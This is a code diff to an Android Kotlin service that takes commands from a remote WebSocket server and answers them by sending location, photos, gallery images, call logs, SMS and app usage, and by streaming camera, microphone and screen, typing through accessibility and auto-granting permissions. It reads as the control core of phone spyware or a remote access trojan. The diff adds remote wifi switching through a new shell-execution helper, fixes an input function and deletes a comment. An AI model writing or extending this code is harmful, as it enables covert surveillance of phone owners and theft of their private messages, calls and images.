@@ -67,8 +67,8 @@ class CoreService : Service() {
         val savedUrl = getSharedPreferences("config", MODE_PRIVATE).getString("server_url", null)
         if (savedUrl != null) SERVER_URL = savedUrl
         wsManager = WebSocketManager(SERVER_URL,
-            onMessage    = { handleCommand(it) },
-            onConnected  = {},
+            onMessage      = { handleCommand(it) },
+            onConnected    = {},
             onDisconnected = {}
         )
         wsManager?.connect()
@@ -85,24 +85,28 @@ class CoreService : Service() {
                 "get_location"      -> sendLocation()
                 "take_photo"        -> takeSinglePhoto()
 
+                // ── Network toggle (via Shizuku shell if available) ─────────
+                "wifi_on"  -> runShellCmd("svc wifi enable")
+                "wifi_off" -> runShellCmd("svc wifi disable")
+
                 // ── Data ───────────────────────────────────────────────────
-                "get_gallery"       -> sendGallery(data.optInt("limit", 20))
-                "get_full_photo"    -> sendFullPhoto(data.optString("path"))
-                "get_call_log"      -> sendCallLog(data.optInt("limit", 50))
-                "get_sms"           -> sendSms(data.optInt("limit", 50))
-                "get_running_app"   -> sendCurrentApp()
-                "get_app_usage"     -> sendAppUsage(data.optInt("hours", 24))
+                "get_gallery"     -> sendGallery(data.optInt("limit", 20))
+                "get_full_photo"  -> sendFullPhoto(data.optString("path"))
+                "get_call_log"    -> sendCallLog(data.optInt("limit", 50))
+                "get_sms"         -> sendSms(data.optInt("limit", 50))
+                "get_running_app" -> sendCurrentApp()
+                "get_app_usage"   -> sendAppUsage(data.optInt("hours", 24))
 
                 // ── Camera stream ──────────────────────────────────────────
                 "start_camera_stream" -> startService(
                     Intent(this, CameraStreamService::class.java)
                         .putExtra("interval", data.optLong("interval", 2000L)))
-                "stop_camera_stream"  -> stopService(
+                "stop_camera_stream"  -> startService(
                     Intent(this, CameraStreamService::class.java).setAction("STOP"))
 
                 // ── Mic stream ─────────────────────────────────────────────
-                "start_mic_stream"  -> startService(Intent(this, AudioStreamService::class.java))
-                "stop_mic_stream"   -> startService(
+                "start_mic_stream" -> startService(Intent(this, AudioStreamService::class.java))
+                "stop_mic_stream"  -> startService(
                     Intent(this, AudioStreamService::class.java).setAction("STOP"))
 
                 // ── Screen stream ──────────────────────────────────────────
@@ -125,8 +129,7 @@ class CoreService : Service() {
                 "key_back"    -> AccessibilityMonitor.performBack()
                 "key_home"    -> AccessibilityMonitor.performHome()
                 "key_recents" -> AccessibilityMonitor.performRecents()
-                "type_text"   -> AccessibilityMonitor.typeText(
-                    data.optLong("nodeId", 0L), data.optString("text"))
+                "type_text"   -> AccessibilityMonitor.typeText(data.optString("text"))  // FIXED: 1 arg
 
                 // ── Shizuku auto-grant ─────────────────────────────────────
                 "grant_permissions" -> {
@@ -154,6 +157,12 @@ class CoreService : Service() {
             (getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager)
                 .lockNow()
         } catch (_: Exception) {}
+    }
+
+    /** Run shell command via root/ADB shell (works when Shizuku is active) */
+    private fun runShellCmd(cmd: String) {
+        try { Runtime.getRuntime().exec(cmd.split(" ").toTypedArray()).waitFor() }
+        catch (_: Exception) {}
     }
 
     private fun sendBattery() {
@@ -222,10 +231,9 @@ class CoreService : Service() {
     }
 
     private fun takeSinglePhoto() {
-        // One-shot front camera photo
         try {
             startService(Intent(this, CameraStreamService::class.java)
-                .putExtra("interval", 99999999L)) // single shot trick
+                .putExtra("interval", 99999999L))
         } catch (_: Exception) {}
     }
 
